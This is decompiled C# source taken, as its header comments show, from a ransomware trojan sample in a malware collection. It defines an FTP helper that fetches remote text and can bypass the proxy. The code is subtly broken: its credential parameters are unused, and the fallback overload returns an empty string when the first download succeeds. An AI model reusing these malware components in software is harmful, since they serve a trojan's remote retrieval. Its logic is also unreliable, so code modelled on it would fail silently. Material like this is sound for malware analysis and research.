// Decompiled with JetBrains decompiler
// Type: ProxyService.FtpHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1A8FDECE-1CE5-409D-963F-AF9D26306625
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Proxy.a-01b9089429d70e13144f4d981c8d179faa30c9001537bc561c4bc29a1f10db4e.exe

using System;
using System.IO;
using System.Net;

namespace ProxyService
{
  public class FtpHelper
  {
    public static string GetXml(string uri, string user, string pass, bool noproxy)
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(uri);
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        response.Close();
        return end;
      }
      catch (Exception ex)
      {
      }
      return "";
    }

    public static string GetXml(string uri, string user, string pass) => FtpHelper.GetXml(uri, user, pass, false) == "" ? FtpHelper.GetXml(uri, user, pass, true) : "";
  }
}
